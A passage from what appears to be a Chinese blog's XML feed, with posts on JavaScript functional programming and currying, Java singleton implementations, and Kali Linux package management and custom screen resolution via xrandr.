class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> n <span class="token operator">*</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">factorial</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 3 x 2 x 1 = 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**.map() .reduce()**等 也是申明式编程函数；</p><h1 id="函数合成"><a href="#函数合成" class="headerlink" title="函数合成"></a>函数合成</h1><p>一个值变成另一个值，中间经过多个函数，将多个函数合并为一个函数来实现；</p><p>举个例子：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 高中数学常见的过程g(x) &#x3D; 2x;h(x) &#x3D; x + 3;f(x) &#x3D; 2x + 3;&#x2F;&#x2F; 则可变换为以下形式，即我们所学的复合函数f(x) &#x3D; h(g(x));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的<strong>f(x)**便是一个合成函数，实现了变量</strong>x<strong>到</strong>2x + 3**的转变；</p><p>js的实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">gFn</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> x <span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">hFn</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> x <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">hFn</span><span class="token punctuation">(</span><span class="token function">gFn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 5</span><span class="token comment">// 使用函数合成</span><span class="token keyword">function</span> <span class="token function">fFn</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">hFn</span><span class="token punctuation">(</span><span class="token function">gFn</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">fFn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="函数柯理化-Currying"><a href="#函数柯理化-Currying" class="headerlink" title="函数柯理化(Currying)"></a>函数柯理化(Currying)</h1><p>以逻辑学家**<em>Haskell Curry**</em>命名，即使接收多个参数的函数变成接受单个参数的函数的过程。单参数会使函数合成更简单；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 原函数</span><span class="token keyword">function</span> <span class="token function">plusFn</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> x <span class="token operator">+</span> y <span class="token operator">+</span> z<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">plusFn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 6</span><span class="token comment">// 柯理化后</span><span class="token keyword">function</span> <span class="token function">plusFn</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">y</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">z</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> x <span class="token operator">+</span> y <span class="token operator">+</span> z<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">plusFn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程范式 函数式编程 命令式编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象设计之单例模式</title>
      <link href="/2024/09/27/hou-duan/java-mian-xiang-dui-xiang-she-ji-zhi-dan-li-mo-shi/"/>
      <url>/2024/09/27/hou-duan/java-mian-xiang-dui-xiang-she-ji-zhi-dan-li-mo-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="模式动机"><a href="#模式动机" class="headerlink" title="模式动机"></a>模式动机</h2><p>对于系统中的某些类来说，只有一个实例很重要，例如，一个系统中可以存在多个打印任务，但是只能有一个正在工作的任务；一个系统只能有一个窗口管理器或文件系统；一个系统只能有一个计时工具或ID（序号）生成器。</p><p>如何保证一个类只有一个实例并且这个实例易于被访问呢？定义一个全局变量可以确保对象随时都可以被访问，但不能防止我们实例化多个对象。</p><p>一个更好的解决办法是让类自身负责保存它的唯一实例。这个类可以保证没有其他实例被创建，并且它可以提供一个访问该实例的方法。这就是单例模式的模式动机。</p><h2 id="模式定义"><a href="#模式定义" class="headerlink" title="模式定义"></a>模式定义</h2><blockquote><p><strong>单例模式(<code>Singleton Pattern</code>)**：单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例，这个类称为单例类，它提供全局访问的方法。单例模式是一种</strong>对象创建型模式**。单例模式又名单件模式或单态模式。</p></blockquote><p>单例模式的要点有三个：</p><ul><li>一是某个类只能有一个实例；</li><li>二是它必须自行创建这个实例；</li><li>三是它必须自行向整个系统提供这个实例。</li></ul><h2 id="模式结构"><a href="#模式结构" class="headerlink" title="模式结构"></a>模式结构</h2><h3 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h3><ul><li><code>Singleton</code>: 单例</li></ul><h3 id="UML类图"><a href="#UML类图" class="headerlink" title="UML类图"></a>UML类图</h3><p><img src="https://statics.sh1a.qingstor.com/2018/10/29/Java-design-singleton-uml.jpg" alt="单例模式UML类图"></p><h3 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h3><p><img src="https://statics.sh1a.qingstor.com/2018/10/29/Java-design-singleton-seq.jpg" alt="单例模式时序图"></p><h2 id="代码实现方式"><a href="#代码实现方式" class="headerlink" title="代码实现方式"></a>代码实现方式</h2><h3 id="1-饿汉式（推荐使用）"><a href="#1-饿汉式（推荐使用）" class="headerlink" title="1. 饿汉式（推荐使用）"></a>1. 饿汉式（推荐使用）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 饿汉式单例模式. * * @author blinkfox on 2017-10-23. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/** 全局唯一实例. */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Singleton</span> singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：这种方式避免了多线程的同步问题，但不是懒加载。如果不需要懒加载的方式，推荐使用。</p></blockquote><h3 id="2-非线程安全懒汉式（不推荐使用）"><a href="#2-非线程安全懒汉式（不推荐使用）" class="headerlink" title="2. 非线程安全懒汉式（不推荐使用）"></a>2. 非线程安全懒汉式（不推荐使用）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 非线程安全的懒汉式. * * @author blinkfox on 2017-10-23. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> singleton<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 通过懒加载的方式获取实例，但是非线程安全.     * @return Singleton实例     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：是懒加载的方式，但非线程安全。不推荐使用。</p></blockquote><h3 id="3-低效的线程安全懒汉式（不推荐使用）"><a href="#3-低效的线程安全懒汉式（不推荐使用）" class="headerlink" title="3. 低效的线程安全懒汉式（不推荐使用）"></a>3. 低效的线程安全懒汉式（不推荐使用）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 低效的线程安全的懒汉式. * * @author blinkfox on 2017-10-23. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> singleton<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 通过 synchronized 关键字来保证线程安全，也是懒加载的方式来获取实例.     * @return Singleton实例     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token class-name">Singleton</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：是懒加载的方式，也线程安全，但是效率很低。因为99%的情况下是不需要去同步的。不推荐使用。</p></blockquote><h3 id="4-双重校验锁线程安全懒汉式（不推荐使用）"><a href="#4-双重校验锁线程安全懒汉式（不推荐使用）" class="headerlink" title="4. 双重校验锁线程安全懒汉式（不推荐使用）"></a>4. 双重校验锁线程安全懒汉式（不推荐使用）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 双重校验锁线程安全懒汉式. * * @author blinkfox on 2017-10-23. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> singleton<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 通过'双重校验锁'来更高效的保证线程安全，也是懒加载的方式来获取实例.     * @return Singleton实例     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：是懒加载的方式，也线程安全，效率也不错。但受限于Jdk5以前的Java内存模型，仍然会有bug，Java5及之后才能正常达到单例效果。</p></blockquote><h3 id="5-枚举式（强烈推荐使用）"><a href="#5-枚举式（强烈推荐使用）" class="headerlink" title="5. 枚举式（强烈推荐使用）"></a>5. 枚举式（强烈推荐使用）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 枚举方式的单例. * * @author blinkfox on 2017-10-23. */</span><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token constant">INSTANCE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：在<code>《Effective Java》</code>一书中强烈推荐使用枚举来实现单例模式，该方式简单可自由序列化；保证只有一个实例（即使使用反射机制也无法多次实例化一个枚举量）；线程安全。唯一的缺点是非懒加载方式。</p></blockquote><h3 id="6-静态内部类（推荐使用）"><a href="#6-静态内部类（推荐使用）" class="headerlink" title="6. 静态内部类（推荐使用）"></a>6. 静态内部类（推荐使用）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 通过使用静态内部类的方式来实现懒加载且线程安全的创建单例. * * @author blinkfox on 2017-10-23. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 静态内部类.     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">SingletonHolder</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token class-name">SingletonHolder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton4</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 通过懒加载的方式获取Singleton唯一实例的方法.     * @return Singleton实例     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">SingletonHolder</span><span class="token punctuation">.</span>instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：这种方式利用了<code>ClassLoader</code>的机制保证初始化<code>instance</code>时只有一个线程，其只有显示通过调用<code>getInstance</code>方法时，才会显示装载<code>SingletonHolder</code>类，从而实例化<code>instance</code>。</p></blockquote><h2 id="模式分析"><a href="#模式分析" class="headerlink" title="模式分析"></a>模式分析</h2><p>单例模式的目的是保证一个类仅有一个实例，并提供一个访问它的全局访问点。单例模式包含的角色只有一个，就是单例类——<code>Singleton</code>。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>提供了对唯一实例的受控访问。因为单例类封装了它的唯一实例，所以它可以严格控制客户怎样以及何时访问它，并为设计及开发团队提供了共享的概念。</li><li>由于在系统内存中只存在一个对象，因此可以节约系统资源，对于一些需要频繁创建和销毁的对象，单例模式无疑可以提高系统的性能。</li><li>允许可变数目的实例。我们可以基于单例模式进行扩展，使用与单例控制相似的方法来获得指定个数的对象实例。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>由于单例模式中没有抽象层，因此单例类的扩展有很大的困难。</li><li>单例类的职责过重，在一定程度上违背了“单一职责原则”。因为单例类既充当了工厂角色，提供了工厂方法，同时又充当了产品角色，包含一些业务方法，将产品的创建和产品的本身的功能融合到一起。</li><li>滥用单例将带来一些负面问题，如为了节省资源将数据库连接池对象设计为单例类，可能会导致共享连接池对象的程序过多而出现连接池溢出；现在很多面向对象语言(如<code>Java</code>、<code>C#</code>)的运行环境都提供了自动垃圾回收的技术，因此，如果实例化的对象长时间不被利用，系统会认为它是垃圾，会自动销毁并回收资源，下次利用时又将重新实例化，这将导致对象状态的丢失。</li></ul><h3 id="适用环境"><a href="#适用环境" class="headerlink" title="适用环境"></a>适用环境</h3><p>在以下情况下可以使用单例模式：</p><ul><li>系统只需要一个实例对象，如系统要求提供一个唯一的序列号生成器，或者需要考虑资源消耗太大而只允许创建一个对象。</li><li>客户调用类的单个实例只允许使用一个公共访问点，除了该公共访问点，不能通过其他途径访问该实例。</li><li>在一个系统中要求一个类只有一个实例时才应当使用单例模式。反过来，如果一个类可以有几个实例共存，就需要对单例模式进行改进，使之成为多例模式。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例，这个类称为单例类，它提供全局访问的方法。单例模式的要点有三个：一是某个类只能有一个实例；二是它必须自行创建这个实例；三是它必须自行向整个系统提供这个实例。单例模式是一种对象创建型模式。</li><li>单例模式只包含一个单例角色：在单例类的内部实现只生成一个实例，同时它提供一个静态的工厂方法，让客户可以使用它的唯一实例；为了防止在外部对其实例化，将其构造函数设计为私有。</li><li>实现单例模式，如果不需要懒加载的效果，则推荐使用枚举和饿汉式的方式；如果需要懒加载的效果，则推荐使用静态内部类来实现更好。</li><li>单例模式的主要优点在于提供了对唯一实例的受控访问并可以节约系统资源；其主要缺点在于因为缺少抽象层而难以扩展，且单例类职责过重。</li><li>单例模式适用情况包括：系统只需要一个实例对象；客户调用类的单个实例只允许使用一个公共访问点。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 之软件安装、卸载、更新和修改更新源</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/kali-linux-zhi-ruan-jian-an-zhuang-xie-zai-geng-xin-he-xiu-gai-geng-xin-yuan/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/kali-linux-zhi-ruan-jian-an-zhuang-xie-zai-geng-xin-he-xiu-gai-geng-xin-yuan/</url>
      
        <content type="html"><![CDATA[<p>使用Linux系统，与Windows系统一样，也需要及时进行软件与系统的更新。</p><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>这里以 <a href="https://blog.csdn.net/knigh_yun/article/details/79949512">Kali Linux</a> 系统为例，介绍常用的软件安装、卸载与更新命令：</p><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>安装前先搜索一下更新源中是否有该软件，这里使用 <code>apt</code> 命令，貌似比另外一个类似的命令 <code>apt-get</code> 友好一些。</p><p>例如安装 <code>leafpad</code> 这个软件：</p><pre><code>apt search leafpad</code></pre><p>然后安装这个软件：</p><pre><code>apt install leafpad</code></pre><p>然后确定安装就行了。</p><blockquote><p>有时会出现一些 <code>failed</code> 可以按照提示使用命令 <code>apt install --fix-missing</code> 修复。</p></blockquote><h2 id="软件卸载"><a href="#软件卸载" class="headerlink" title="软件卸载"></a>软件卸载</h2><p>简单卸载软件：</p><pre><code>apt remove leafpad</code></pre><p>卸载软件并移除配置文件：</p><pre><code>apt-get purge leafpad</code></pre><p>卸载自动安装并且未使用的软件</p><pre><code>apt autoremove</code></pre><h2 id="软件更新"><a href="#软件更新" class="headerlink" title="软件更新"></a>软件更新</h2><p>先更新一下源：</p><pre><code>apt update</code></pre><blockquote><p>这个操作并没有开始更新软件，类似于将远程源中的最新版本信息更新到本地</p></blockquote><p>接下来才开始更新软件：</p><pre><code>apt upgrade</code></pre><p>更新系统：</p><pre><code>apt full-upgrade</code></pre><p>或者：</p><pre><code>apt-get dist-upgrade</code></pre><p>清理安装包：</p><pre><code>apt-get cleanapt-get autoclean</code></pre><h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><p>Linux 更新源文件位于 <code>/etc/apt/sources.list</code> ，系统就是从这个文件中读取一些网址参数下载安装软件，默认的是 kali 官方源，我们可以修改为国内一些较快的源，例如阿里、中科大、网易等，加快下载速度。</p><p>找到并编辑上述 <code>sources.list</code> 源文件，替换为以下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#aliyun 阿里云</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment"># ustc 中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span class="token comment">#deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><span class="token comment">#deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><span class="token comment"># kali 官方源</span>deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib <span class="token comment"># 默认的，可以注释掉不用管</span><span class="token comment">#deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span><span class="token comment">#deb-src http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是目前加快的，也可以百度一下增加其它源</p><hr>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux安装软件 Linux更新源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 自定义分辨率</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/kali-linux-zi-ding-yi-fen-bian-lu/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/kali-linux-zi-ding-yi-fen-bian-lu/</url>
      
        <content type="html"><![CDATA[<p>Kali中无分辨率1920 x 1080，自定义的步骤：</p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>控制台输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cvt <span class="token number">1920</span> <span class="token number">1080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会得到以下内容：</p><pre class="line-numbers language-none"><code class="language-none"># 1920x1080 59.96 Hz (CVT 2.07M9) hsync: 67.16 kHz; pclk: 173.00 MHzModeline &quot;1920x1080_60.00&quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>复制后面的内容，然后在新控制台输入：</p><pre class="line-numbers language-none"><code class="language-none">sudo xrandr --newmode &quot;1920x1080_60.00&quot; 173.00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> xrandr <span class="token parameter variable">--addmode</span> Virtual1 <span class="token string">"1920x1080_60.00"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后系统设置选择分辨率或者：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> xrandr <span class="token parameter variable">--output</span> Virtual1 <span class="token parameter variable">--mode</span> <span class="token string">"1920x1080_60.00"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是此方法<strong>重启会失效</strong>，因此可以使用方法二；</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>在 <code>/etc/profile</code> 文件末尾假如以下代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr <span class="token parameter variable">--newmode</span> <span class="token string">"1920x1080_60.00"</span> <span class="token number">173.00</span> <span class="token number">1920</span> <span class="token number">2048</span> <span class="token number">2248</span> <span class="token number">2576</span> <span class="token number">1080</span> <span class="token number">1083</span> <span class="token number">1088</span> <span class="token number">1120</span> <span class="token parameter variable">-hsync</span> +vsyncxrandr <span class="token parameter variable">--addmode</span> Virtual1 <span class="token string">"1920x1080_60.00"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重启完成。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux分辨率 cvt xrandr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中 apt install 的 lock 问题</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/linux-zhong-apt-install-de-lock-wen-ti/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/linux-zhong-apt-install-de-lock-wen-ti/</url>
      
